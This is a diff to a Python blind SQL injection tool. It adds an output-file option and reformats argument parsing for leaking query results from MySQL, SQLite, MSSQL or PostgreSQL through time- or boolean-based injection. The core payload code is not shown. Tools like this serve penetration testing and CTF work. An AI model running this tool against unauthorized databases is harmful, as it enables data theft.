@@ -339,17 +339,17 @@ class MSSQL(Database):
         return f'({query})>{number}'
 
 
-def save_leak(query, leak):
+def save_leak(output, query, leak):
     if len(leak) > 0:
-        with open('output.txt', 'a') as f:
+        with open(output, 'a') as f:
             f.write(f'{query}\n')
             for i, entry in enumerate(leak):
                 f.write(f'row {i+1}: {entry}\n')
             f.write('\n')
-        print('[+] saved all rows in output.txt')
+        print(f'[+] saved all rows in {output}')
 
 
-def main(db_type, sqli_type, query):
+def main(db_type, sqli_type, query, output):
     print('\033[1m\033[94mBlind SQL injection script\033[0m\033[0m\n')
 
     if db_type == 'postgresql':
@@ -369,7 +369,7 @@ def main(db_type, sqli_type, query):
 
     # exploit!
     leak = db.leak_query(query)
-    save_leak(query, leak)
+    save_leak(output, query, leak)
 
     end = time.time()
     run_time = str(datetime.timedelta(seconds=round(end-start)))
@@ -380,29 +380,39 @@ def main(db_type, sqli_type, query):
 if __name__ == '__main__':
     try:
         parser = argparse.ArgumentParser(description='MySQLi, a blind SQL injection script')
-        parser.add_argument('-q',
-                            '--query',
-                            dest='query',
-                            help='The SQL query to leak',
-                            default='')
-        parser.add_argument('-db',
-                            '--database',
-                            dest='db',
-                            help='Database type',
-                            choices=['mysql', 'sqlite', 'mssql', 'postgresql'],
-                            required=True)
-        parser.add_argument('-t',
-                            '--type',
-                            dest='type',
-                            help='SQL injection type',
-                            choices=['time', 'boolean'],
-                            required=True)
+        parser.add_argument(
+            '-q',
+            '--query',
+            dest='query',
+            metavar='"SELECT foo FROM bar"',
+            help='The SQL query to leak',
+            default='')
+        parser.add_argument(
+            '-db',
+            '--database',
+            dest='db',
+            help='Database type',
+            choices=['mysql', 'sqlite', 'mssql', 'postgresql'],
+            required=True)
+        parser.add_argument(
+            '-t',
+            '--type',
+            dest='type',
+            help='SQL injection type',
+            choices=['time', 'boolean'],
+            required=True)
+        parser.add_argument('-o',
+            '--output',
+            dest='output',
+            metavar='output.txt',
+            help='Filename to save the output',
+            default='output.txt')
         args = parser.parse_args()
 
         if args.db == 'mssql' and args.type == 'time':
             exit('MSSQL only supports boolean based SQLi, sorry!')
 
-        main(args.db, args.type, args.query)
+        main(args.db, args.type, args.query, args.output)
     except KeyboardInterrupt:
         print('')
 
